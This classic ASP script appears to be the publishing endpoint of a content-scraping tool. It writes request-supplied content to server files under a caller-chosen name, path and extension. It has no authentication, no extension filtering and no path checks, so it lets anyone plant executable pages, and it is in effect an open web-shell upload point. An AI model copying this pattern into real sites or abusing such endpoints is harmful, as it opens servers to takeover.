<%
Dim pagecode,filename,savepath,filetype,request_type,linksplit,savefullpath
Dim host,url,script_name,script_url,current_path
Dim USER_AGENT



pagecode = Trim(Request("PageCode"))
filename = Trim(Request("FileName"))
savepath = Trim(Request("SavePath"))
filetype = Trim(Request("FileType"))
postmodule = Trim(Request("PostModule"))
request_type = Trim(Request("RequestType"))
linksplit = Trim(Request("LinkSplit"))
host = Request.ServerVariables("HTTP_HOST")  
url = Request.ServerVariables("PATH_INFO") 
script_name = Request.ServerVariables("SCRIPT_NAME")
script_url = "http://" & host & script_name
current_path = left(Server.MapPath(url),InstrRev(Server.MapPath(url),"\"))

if savepath = "\" or savepath = "" Then
  savepath = current_path
  savefullpath = savepath & filename & "." & filetype
else
  savepath = current_path & savepath & "\"
  savefullpath = savepath & filename & "." & filetype
end if

current_url = left(script_url,InstrRev(script_url,"/"))
current_url = current_url & replace(replace(savefullpath,current_path,""),"\","/")

if postmodule="mirror" then
  
  call CreateFolder(savepath)
  call showFolderFileCount(savepath)
 
else

  if request_type="Post" then
	Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
	if not objFSO.FolderExists(savepath) then 
	  objFSO.CreateFolder(savepath)
	end If
	
	If not objFSO.FileExists(savefullpath) Then
	  call WriteToUTF(savefullpath,pagecode,"UTF-8")
	  response.write current_url & linksplit & "1"
	else
	  call Deltextfile(savefullpath)
	  call WriteToUTF(savefullpath,pagecode,"UTF-8")
	  response.write current_url & linksplit & "2"
	end if
	Set objFSO = Nothing
  elseif request_type="Test" then
	response.write "======================================================" & Chr("10")
	response.write "FilePath : - " & savefullpath & Chr("10")
	response.write "URL : - " & current_url & Chr("10")
	response.write "PageCode :" & Chr("10")
	response.write pagecode & Chr("10")
	response.write "======================================================"
  end if

end if

Sub WriteToUTF(FileUrl,Str,CharSet)
  set stm=server.CreateObject("adodb.stream")
  stm.Type=2
  stm.mode=3
  stm.charset=CharSet
  stm.open
  stm.WriteText str
  stm.SaveToFile FileUrl,2
  stm.flush
  stm.Close
  set stm=nothing
end Sub

Function Deltextfile(fileurl)
 Set delete_file = CreateObject("Scripting.FileSystemObject") 
  if delete_file.FileExists(fileurl) then
   delete_file.DeleteFile(fileurl) 
  end if 
 Set delete_file = nothing 
End Function

Function CreateFolder(strFolder)
  Dim strTestFolder,objFSO 
  strTestFolder = strFolder
  Set objFSO = CreateObject("Scripting.FileSystemObject") 
  If not objFSO.FolderExists(strTestFolder) Then 
	objFSO.CreateFolder(strTestFolder) 
  End If 
  Set objFSO = Nothing 
End function 

sub showFolderFileCount(path)
dim fso 
dim objFolder 
dim objFiles 
dim objFile 
set fso=server.CreateObject("scripting.filesystemobject") 
set objFolder=fso.GetFolder(path)
set objFiles=objFolder.Files
if objFiles.count>=1 then
  Response.Write objFiles.count 
else
  Response.Write "0"
end if
set objFile=nothing 
set objFiles=nothing 
set objFolder=nothing 
set fso=nothing 
end sub
%>
